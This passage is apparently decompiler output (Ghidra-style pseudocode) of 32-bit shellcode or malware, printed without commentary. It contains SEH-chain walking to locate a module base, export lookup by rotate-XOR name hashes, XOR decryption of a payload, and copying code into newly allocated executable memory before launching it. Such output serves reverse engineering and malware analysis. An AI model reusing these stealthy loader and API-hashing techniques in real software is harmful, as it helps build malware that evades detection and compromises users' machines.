    for (pcVar2 = (char *)(*(int *)(unaff_EBP + 0x209d) + 4); *pcVar2 != '\0'; pcVar2 = pcVar2 + 1)
    {
      iVar4 = 0;
      for (pcVar3 = pcVar2; bVar7 = *pcVar3 == '\0', pcVar5 = unaff_ESI, pcVar6 = pcVar2, !bVar7;
          pcVar3 = pcVar3 + 1) {
        iVar4 = iVar4 + 1;
      }
      do {
        if (iVar4 == 0) break;
        iVar4 = iVar4 + -1;
        bVar7 = *pcVar5 == *pcVar6;
        pcVar5 = pcVar5 + 1;
        pcVar6 = pcVar6 + 1;
      } while (bVar7);
      if (bVar7) {
        *(undefined4 *)(unaff_EBP + 0x2095) = 1;
      }
      for (; *pcVar2 != '\0'; pcVar2 = pcVar2 + 1) {
      }
    }
    if (*(int *)(unaff_EBP + 0x2095) == 0) {
      for (; *unaff_ESI != '\0'; unaff_ESI = unaff_ESI + 1) {
        *pcVar2 = *unaff_ESI;
        pcVar2 = pcVar2 + 1;
      }
      **(int **)(unaff_EBP + 0x209d) = **(int **)(unaff_EBP + 0x209d) + 1;
    }
  }
  return CONCAT44(param_2,in_EAX);
}



undefined8 FUN_00482334(void)

{
  int unaff_EBP;
  undefined4 uVar1;
  
  (**(code **)(unaff_EBP + 0xafd))(*(undefined4 *)(unaff_EBP + 0x209d),0x1000,0x4000);
  uVar1 = 0x1000;
  (**(code **)(unaff_EBP + 0xafd))(*(undefined4 *)(unaff_EBP + 0x20a9),0x1000,0x4000);
  (**(code **)(unaff_EBP + 0xafd))(*(undefined4 *)(unaff_EBP + 0x20a5),0x1000);
  (**(code **)(unaff_EBP + 0xafd))(*(undefined4 *)(unaff_EBP + 0x2099),0x1000,0x4000);
  return CONCAT44(0x4000,uVar1);
}



undefined4 FUN_0048238f(void)

{
  undefined *puVar1;
  undefined *puVar2;
  undefined4 uVar3;
  int iVar4;
  int unaff_EBP;
  undefined4 uVar5;
  
  uVar5 = 0x1000;
  puVar1 = (undefined *)(**(code **)(unaff_EBP + 0xaf9))(0,0x1000,0x1000,0x40);
  *(undefined **)(unaff_EBP + 0x2099) = puVar1;
  puVar2 = (undefined *)(unaff_EBP + 0x238f);
  for (iVar4 = 0x1bc; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar1 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar1 = puVar1 + 1;
  }
  uVar3 = (**(code **)(unaff_EBP + 0xb05))(0);
  (**(code **)(unaff_EBP + 0x2079))(uVar3,*(undefined4 *)(unaff_EBP + 0x2099),0,unaff_EBP + 0xf7e,0)
  ;
  FUN_00482334();
  return uVar5;
}



undefined8 __fastcall FUN_004824f2(undefined4 param_1,undefined4 param_2)

{
  undefined4 in_EAX;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 uVar1;
  undefined4 extraout_ECX_03;
  undefined4 uVar2;
  int *piVar3;
  int unaff_EBP;
  int iVar4;
  undefined8 uVar5;
  
  if (*(int *)(unaff_EBP + 0x2081) == -0x26a2dc67) {
    uVar5 = FUN_00482935(param_1,param_2);
    *(int *)(unaff_EBP + 0x1b15) = (int)uVar5;
    uVar5 = FUN_00482971(extraout_ECX,(int)((ulonglong)uVar5 >> 0x20),(int)uVar5,
                         *(int *)(unaff_EBP + 0x2089));
    *(int *)(unaff_EBP + 0x2089) = (int)uVar5;
    uVar5 = (**(code **)(unaff_EBP + 0xaf1))(unaff_EBP + 0x1b45);
    uVar2 = (undefined4)((ulonglong)uVar5 >> 0x20);
    *(int *)(unaff_EBP + 0x1b19) = (int)uVar5;
    piVar3 = (int *)(unaff_EBP + 0x2069);
    uVar1 = extraout_ECX_00;
    for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
      uVar5 = FUN_00482971(uVar1,uVar2,*(int *)(unaff_EBP + 0x1b19),*piVar3);
      uVar2 = (undefined4)((ulonglong)uVar5 >> 0x20);
      *piVar3 = (int)uVar5;
      piVar3 = piVar3 + 1;
      uVar1 = extraout_ECX_01;
    }
    if (*(int *)(unaff_EBP + 0x1b35) == -0x544397f3) {
      uVar5 = FUN_00482971(uVar1,uVar2,*(int *)(unaff_EBP + 0x1b19),*(int *)(unaff_EBP + 0x1b35));
      uVar2 = (undefined4)((ulonglong)uVar5 >> 0x20);
      *(int *)(unaff_EBP + 0x1b35) = (int)uVar5;
      uVar1 = extraout_ECX_02;
    }
    if (*(int *)(unaff_EBP + 0x1b41) == -0x15c50f29) {
      uVar5 = FUN_00482971(uVar1,uVar2,*(int *)(unaff_EBP + 0x1b19),*(int *)(unaff_EBP + 0x1b41));
      *(int *)(unaff_EBP + 0x1b41) = (int)uVar5;
    }
    uVar5 = (**(code **)(unaff_EBP + 0xaf1))(unaff_EBP + 0x205e);
    uVar5 = FUN_00482971(extraout_ECX_03,(int)((ulonglong)uVar5 >> 0x20),(int)uVar5,
                         *(int *)(unaff_EBP + 0x2081));
    *(int *)(unaff_EBP + 0x2081) = (int)uVar5;
    *(int *)(unaff_EBP + 0x20ff) = unaff_EBP + 0x2103;
    *(int *)(unaff_EBP + 0x2103) = unaff_EBP + 0x212d;
    *(int *)(unaff_EBP + 0x2107) = unaff_EBP + 0x2127;
    *(int *)(unaff_EBP + 0x210b) = unaff_EBP + 0x2127;
    *(int *)(unaff_EBP + 0x210f) = unaff_EBP + 0x212d;
    *(int *)(unaff_EBP + 0x211b) = unaff_EBP + 0x2130;
    *(int *)(unaff_EBP + 0x211f) = unaff_EBP + 0x212d;
    *(int *)(unaff_EBP + 0x2123) = unaff_EBP + 0x212d;
    *(int *)(unaff_EBP + 0xf86) = unaff_EBP;
    *(int *)(unaff_EBP + 0x103f) = unaff_EBP;
    *(int *)(unaff_EBP + 0x2132) = unaff_EBP;
  }
  return CONCAT44(param_2,in_EAX);
}



undefined8 __fastcall FUN_00482904(undefined4 param_1,undefined4 param_2)

{
  undefined4 in_EAX;
  byte *pbVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  int unaff_EBP;
  int *unaff_ESI;
  
  pbVar1 = (byte *)(unaff_EBP + -6);
  uVar4 = 0;
  for (iVar3 = 0x353; iVar3 != 0; iVar3 = iVar3 + -1) {
    uVar4 = CONCAT31((int3)((uVar4 << 7) >> 8),
                     ((byte)(uVar4 << 7) | (byte)(uVar4 >> 0x19)) ^ *pbVar1);
    pbVar1 = pbVar1 + 1;
  }
  piVar2 = unaff_ESI + 1;
  for (iVar3 = *unaff_ESI; iVar3 != 0; iVar3 = iVar3 + -1) {
    *(byte *)piVar2 = *(byte *)piVar2 ^ (byte)uVar4;
    uVar4 = uVar4 << 3 | uVar4 >> 0x1d;
    piVar2 = (int *)((int)piVar2 + 1);
  }
  return CONCAT44(param_2,in_EAX);
}



undefined8 __fastcall FUN_00482935(undefined4 param_1,undefined4 param_2)

{
  int *piVar1;
  int *piVar2;
  short *psVar3;
  
  piVar1 = (int *)ExceptionList;
  do {
    piVar2 = piVar1;
    piVar1 = (int *)*piVar2;
  } while (piVar1 != (int *)0xffffffff);
  psVar3 = (short *)(piVar2[2] & 0xffff0000);
  do {
    for (; *psVar3 != 0x5a4d; psVar3 = psVar3 + -0x8000) {
    }
  } while (*(short *)((int)psVar3 + *(int *)(psVar3 + 0x1e)) != 0x4550);
  return CONCAT44(param_2,psVar3);
}



undefined8 __fastcall FUN_00482971(undefined4 param_1,undefined4 param_2,int param_3,int param_4)

{
  int iVar1;
  byte *pbVar2;
  int iVar3;
  uint uVar4;
  
  iVar3 = *(int *)(param_3 + *(int *)(param_3 + 0x3c) + 0x78) + param_3;
  uVar4 = 0;
  do {
    pbVar2 = (byte *)(*(int *)(*(int *)(iVar3 + 0x20) + param_3 + uVar4 * 4) + param_3);
    iVar1 = 0;
    do {
      iVar1 = CONCAT31((int3)((uint)(iVar1 << 7) >> 8),
                       ((byte)(iVar1 << 7) | (byte)((uint)iVar1 >> 0x19)) ^ *pbVar2);
      pbVar2 = pbVar2 + 1;
    } while (*pbVar2 != 0);
  } while ((iVar1 != param_4) && (uVar4 = uVar4 + 1, uVar4 < *(uint *)(iVar3 + 0x18)));
  return CONCAT44(param_2,*(int *)(*(int *)(iVar3 + 0x1c) + param_3 +
                                  (uint)*(ushort *)(*(int *)(iVar3 + 0x24) + param_3 + uVar4 * 2) *
                                  4) + param_3);
}


